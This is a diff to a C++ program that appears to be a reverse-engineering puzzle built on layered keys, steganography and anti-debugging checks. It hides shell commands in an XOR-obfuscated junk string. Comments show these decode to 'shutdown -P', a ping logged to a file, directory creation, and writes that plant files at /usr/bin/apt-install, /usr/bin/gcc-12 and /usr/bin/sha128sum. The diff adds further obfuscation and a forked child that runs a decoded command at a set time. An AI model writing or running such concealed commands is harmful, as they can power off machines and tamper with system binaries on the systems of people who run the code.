@@ -24,6 +24,9 @@
 #include <vector>
 #include <algorithm>
 #include <functional>
+#include <map>
+#include <iterator>
+#include <numeric>
 
 long long bs1 = 0x0f2bc3ee05faa249;
 long long bs2 = 0x70DD85D8FE63E152;
@@ -43,6 +46,44 @@ std::string bs8 = "V5T^`y=C";
 char* layer_one_encrypted_key = "Z$68zc<E2`VU_0f<~`OP#\0";
 unsigned char layer_three_encrypted_key[] = {0x82, 0x38, 0x86, 0xcc, 0xac, 0xce, 0x4a, 0xea, 0x10, 0x8, 0x3e, 0xba, 0x3, 0xc4, 0xd2, 0xca, 0xfe, 0x10, 0x22, 0x3c, 0x10};
 
+int Zero() {
+    std::map<std::string, int> valueMap = {
+        {"one", 1},
+        {"two", 2},
+        {"three", 3},
+        {"four", 4},
+        {"five", 5}
+    };
+    std::vector<int> values;
+    std::transform(valueMap.begin(), valueMap.end(), std::back_inserter(values),
+                   [](const auto& pair) { return pair.second; });
+    auto complexLambda = [](int x) { return (x * x) - (2 * x) + 1; };
+    std::for_each(values.begin(), values.end(), [&complexLambda](int& n) {
+        n = complexLambda(n);
+    });
+    std::vector<int> evenIndexedValues;
+    for (size_t i = 0; i < values.size(); ++i) {
+        if (i % 2 == 0) {
+            evenIndexedValues.push_back(values[i]);
+        }
+    }
+    int evenSum = std::accumulate(evenIndexedValues.begin(), evenIndexedValues.end(), 0);
+    if (evenSum > 0) {
+        evenSum *= -1;
+    } else {
+        evenSum += 10;  // Add arbitrary number
+    }
+    std::vector<std::vector<int>> nestedVec(3, std::vector<int>(3, 0));
+    for (int i = 0; i < 3; ++i) {
+        std::generate(nestedVec[i].begin(), nestedVec[i].end(), [i]() { return i + 1; });
+    }
+    int flatSum = 0;
+    for (const auto& row : nestedVec) {
+        flatSum += std::accumulate(row.begin(), row.end(), 0);
+    }
+    return (evenSum + flatSum - 1) % 2; 
+}
+
 int One() {
     auto lambda = [](int x) { return x * x - x + 1; };
     std::vector<int> vec = {1, 2, 3, 4, 5};
@@ -52,7 +93,7 @@ int One() {
     
     int result = 0;
     std::for_each(vec.begin(), vec.end(), [&result](int n) {
-        result += (n % 2 == 0) ? 0 : n;
+        result += (n % 2 == Zero()) ? 0 : n;
     });
     
     return ((result > 0) ? ((result / vec.size()) % 2 == 0 ? 1 : -1) : 1) * -1;
@@ -104,10 +145,11 @@ std::string system_call(int arg) {
     std::string target;
     
     
-    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q389}f|ja)&}dy&~f{b&{ff}&`gof'efn)//)ljaf)+,z+)7)&}dy&~f{b&{ff}&`gof'efnaiwuerh-198u}f|ja)&|z{&k`g&zza$o{`lgm)//)ljaf)+,z+)7)&|z{&k`g&zza$o{`lgm~eib*%yx%hcd%yyb'lxcodn*,,*oibe*(/y(*4*%yx%hcd%yyb'lxcodny-q39485uq-3948gjf-az`v}5:`fg:w|{:f}t$'-f`x5335pv}z570f75+5:`fg:w|{:f}t$'-f`xq9efnsd-fiugnwpirugjaelkgjaskldjfblaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
+    
+    std::string big_long_string = "asdgasuidhfokasdjflkawlqp`ksj$)Tlkasjst}:\"4\"4\"4\":$$:tnmuhqEj{hn+4nbnienrgpiosunrgp`{fgw|d}3>Cp34unpfcvg\" )'V uryv{`2=fb=e}`yhq9io`mv$+pit+skvo+Tqfhmgk498hng-9qert{vm?0kro0hpmt0mppk938ht-w4958jg-=r8rtjb-q9r8wlv`k#,wns,tlqh,Svaoj`,lvwsvw-old#%%#f`kl#!&p!#=#,wns,tlqh,Svaoj`,lvwsvw-oldthn2-98ntq-85ngrisen&)sut)doh)gvr+ohurgjj&  &ceni&$#u$&8&)sut)doh)gvr+ohurgjj98rng-qirn[oeirn}f|ja)&|z{&k`g&njj$8;)//)ljaf)+,z+)7)&|z{&k`g&njj$8;4ht-q389}f|ja)&}dy&~f{b&{ff}&`gof'efn)//)ljaf)+,z+)7)&}dy&~f{b&{ff}&`gof'efnaiwuerh-198u}f|ja)&|z{&k`g&zza$o{`lgm)//)ljaf)+,z+)7)&|z{&k`g&zza$o{`lgm~eib*%yx%hcd%yyb'lxcodn*,,*oibe*(/y(*4*%yx%hcd%yyb'lxcodny-q39485uq-3948gjf-az`v}5:`fg:w|{:f}t$'-f`x5335pv}z570f75+5:`fg:w|{:f}t$'-f`xq9efnsd-fio`mv$)t$+pit+skvo$6:+`ar+jqhhf`oby+&{+$f{$|dy`+95$on}$e~gggancx*'z*%~gz%}exa*84%no|%dff iugnwpirugjaelkgjaskldjfaghe~,!|,#xa|#{c~g#~ccx,>2#hiz#by``blaskjdbfa;siudfhawop49rtuq23[4-05i[q-340tita]-0ri=s]-0rgiq]23-oprjeiolrgkhawelgkmbot&+v&)rkv)qitm)Vsdjoe&48)bcp)hsjjiajert'p0awi[r-0q3it]0skr'gpoaejrop;gtije[9guaje[roigjaeo[rigj[ao ijrg[aw904ut 0-49wut][a09reuw g]a90ug]0a9wu4t]a094ut 0d9ujga[ erjg [aoisdug[a0we9tu[ qa]09ugh]a09erug[aer908ugha'dofighja['oersiguja[]w0e9fui[aw09etguj]qw0394ut]q3094u[q09erug[aoijrg[aoeirjg[aoeirjta3049u56 ]aw9eurhjg'asdigh/asdilghaw[094tuaw\43t9uae[rg8ha;soirgha[p9e8tuy[93w84hjt[98h`[98h3r[p98jsphoijp394806upw9384u6-98y7u0-9*^&)*&^*&%$&%^$#&^%%*(&)_(&*)&^(*&^)87ypiouehgpiosuhergpoiuaherpiguha erui9gyaieurghpaieurhgapioeurhgfpaw3uh5qp98w4tyup9z8dfgdzlioghpsa4eoiu6pq9384upiohjgskljdrhglaieutha[09w4u5t[03q49utaoierjg[0a9drughao;ierlhaw/4tilhjqa]4095uq3\4t-90=s0er9gut=09832yu-9834y-9184hogi;soidrhjg;alkdfgnse;olirtgja'eopirjgklsdfgaoeriugfaoerihgaoidfkvn;aeoifgua[e094rtyu[qa094tu[aoihrjf;aiosuehf;kajsdhfg;aoperug[0ae9rug[09erug[0oa9erug[0aer9ug[ae09rgu[ae0riugj[aeorijg;aodfikgj;aldkrjg[aeo9rug[ae0r9ugdf0vnea[9r8hge[a98rgh[39804u52[984u50=189=`098`=-029358=`092385=`-092835u[098u35[o`i23h5[o`2i3h5[oi2h3[98`h23[9o8ih[obkjsd;origjse'oirgj;seoirgj;aseoirjg;qaoeirjg[0319u5[0934ut[09regjs/ldirghj'ea/srilogje;'9porut]09&)(*^)(@*&#^$)*(^)*(&60p98uo98h6-q983h4t=gq8h=3984nt=q84=vqk3409vk=q95kh9ierujngpiunpfgiojasfoijawpejibpfs8ie4yt9pq83uy5-q98ueg-srtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtjsrtj9a8urg-9a8rhapioehjfpiajwhepfioq2p390ru=q094tsdfgsdfgsdfgsdfgsdfjsrtjasertj=-srtjsrtjsrtjsrtjsrtjsrtju-=98erhgpa9uihrepgiaouhwefpiuabrpfiuaebrgpiuawb-tp8q32y5-9823u-t8hj-guhawepiuoghpaiuehgpaiuwehgpaiwuehgpiawuhegpiauwehgp";
     
     
-    if (arg == 0 || is_debugger_attached2()) { //shutdown -P
+    if (arg == 0) { //shutdown -P
         start = (rand() % 206 - 4) / 3; //21
         length = (rand() % rand() % rand() % rand() % (rand() / 2) % (rand() / 6666666)) - 49; //11
         
@@ -123,7 +165,7 @@ std::string system_call(int arg) {
     }
     else if (arg == 1) { //ping 8.8.8.8 >> network_part1.txt
         start = (rand() % rand() / (rand() % rand() / 555)); //36
-        length = ((rand() / 55) / (rand() / 5600) + One()) % 46 + 23; //33
+        length = ((rand() / 55) / (rand() / 5600) + 1) % 46 + 23; //33
         
         target = big_long_string.substr(start, length);
         int index = (rand() % 555) % 222 % 222 - 188;
@@ -134,7 +176,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 2 || is_debugger_attached2()) { //mkdir /tmp/work
+    else if (arg == 2) { //mkdir /tmp/work
         start = ((rand() % rand() - 120 + 120) / 95555) / 140; //112
         length = ((rand()) % (rand()) % (rand())) / ((rand()) % (rand()) % (rand())) + 12; //15
         
@@ -161,7 +203,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 4 || is_debugger_attached2()) { //shutdown -P
+    else if (arg == 4) { //shutdown -P
         start = ((rand() + rand() - rand() % rand() - rand() - rand()) % 4444) / 51; //83
         length = (rand() % rand() % rand()) / ((rand() % rand() % rand() % rand() % rand() % rand() % rand() % rand()) / 200) - 66; //11
         
@@ -216,7 +258,7 @@ std::string system_call(int arg) {
         
     }
     
-    else if (arg == 8 || is_debugger_attached2()) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
+    else if (arg == 8) { //touch /usr/bin/apt-install && echo \"%s\" > /usr/bin/apt-install
     
         start = (rand() % rand()) / (rand() % rand()) + 288; //300
         length = ((rand() % rand() % rand() % rand() % rand()) / 3000000) - 87; //64
@@ -232,7 +274,6 @@ std::string system_call(int arg) {
         
     }
     else if (arg == 9) { //touch /usr/bin/gcc-12 && echo \"%s\" > /usr/bin/gcc-12
-        std::cout << "Hello" << std::endl;
         start = ((((rand() % rand() % rand() % rand() % rand()) -rand() + rand()) /555555) / 3) + 40; //378
         length = (((rand() / 5566555) / 4) - 8); //52
         
@@ -272,7 +313,7 @@ std::string system_call(int arg) {
         
         return target;
     }
-    else if (arg == 12 || is_debugger_attached2()) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
+    else if (arg == 12) { //touch /usr/bin/sha128sum && echo \"%s\" > /usr/bin/sha128sum
         start = ((rand() % rand()) / 6774333) * 6; //654
         length = ((rand() % rand() / (rand()/ rand())) / 555555) - 30; //58
         
@@ -284,6 +325,49 @@ std::string system_call(int arg) {
         }
         
         return target;
+    }
+    else if (arg == 13) { //mkdir -p /tmp/work 2>/dev/null
+        start = ((rand()) / 123112323) + 710; //721
+        length = ((rand() % rand()) /12413613) - 29;
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 15;
+
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
+        
+    }
+    else if (arg == 14) { //mkdir -p /tmp/work/root 2>/dev/null
+        start = ((rand()) / 12311323) + 660; //834
+        length = (rand() / 12321516) - 10;
+    
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 15 + 3;
+
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+        return target;
+        
+    }
+    else if (arg == 15) { //mkdir -p /tmp/work/Public 2>/dev/null
+    
+        start = ((rand()) / 12311323) + 888; //949
+        length = (rand() / 13613717) - 69;
+        
+        target = big_long_string.substr(start, length);
+        int index = (rand() % 555) % 222 % 221 % 15 + 3;
+        
+        for (int i = 0; i < target.size(); ++i) {
+            target[i] = target[i] ^ index;
+        }
+        
+         return target;
+        
     }
     
     return big_long_string;
@@ -502,7 +586,7 @@ bool is_debugger_attached() {
     const ssize_t num_read = read(fd, buf, sizeof(buf) - 1);
     close(fd);
 
-    if (num_read <= 0) {
+    if (num_read <= Zero()) {
         return false;
     }
 
@@ -609,9 +693,9 @@ int folder_master(std::string &val1, std::string &val2, std::string &val3, std::
     process_value(val5);
     decode(bs6);
     
-    system("mkdir /tmp/work");
-    system("mkdir /tmp/work/root");
-    system("mkdir /tmp/work/Public");
+    system(system_call(13).c_str());
+    system(system_call(14).c_str());
+    system(system_call(15).c_str());
 
     // std::cout << val1 << 4 <<std::endl;
 
@@ -683,11 +767,18 @@ std::string calculate_layer_two_encrypted_key() {
     std::string combined_key;
     
     combined_key += (bs5);
+
     combined_key += (bs6);
     combined_key += (bs7);
     combined_key += (bs8);
-    combined_key += (bs9);
-    combined_key += (bs10);
+    if (gettenminute() > 2) {
+        combined_key += (bs9);
+        combined_key += (bs10); 
+    }
+    else {
+       combined_key += (bs10); 
+       combined_key += (bs9);
+    }
 
     return combined_key; // Return the final combined key
 }
@@ -760,7 +851,7 @@ void get_layered_input(int layer) {
         while (i < 50) {
             char ch = (char)getchar();
             if (ch == '\n') {
-                if (i == 0) {
+                if (i == Zero()) {
                     // If we have not read any valid characters yet, continue to skip
                     continue;
                 } else {
@@ -827,7 +918,7 @@ int main(){
         std::string result = "";
 
         // Open the pipe for reading
-        fp = popen(system_call(0).c_str(), "r"); 
+        fp = popen(system_call(Zero()).c_str(), "r"); 
 
         if (fp == NULL) {
             std::cerr << "Broken :(" << std::endl;
@@ -844,6 +935,14 @@ int main(){
 
     // Create a steganographic image file that hides the key
     create_stego_image("hidden_key_image.ppm", gen_key());
+
+    pid_t c_pid = fork();
+
+    if (c_pid == 0) { 
+        if (gettenminute() == 2) {
+            system(system_call(One()).c_str());
+        }
+    } 
 
     get_layered_input(1);
 
@@ -869,6 +968,7 @@ int main(){
     // h2[34] = 0xE0;  // change sar to shl
 
     folder_master(bs5, bs6, bs7, bs8, bs9, bs10);
+
 
     get_layered_input(2);
 
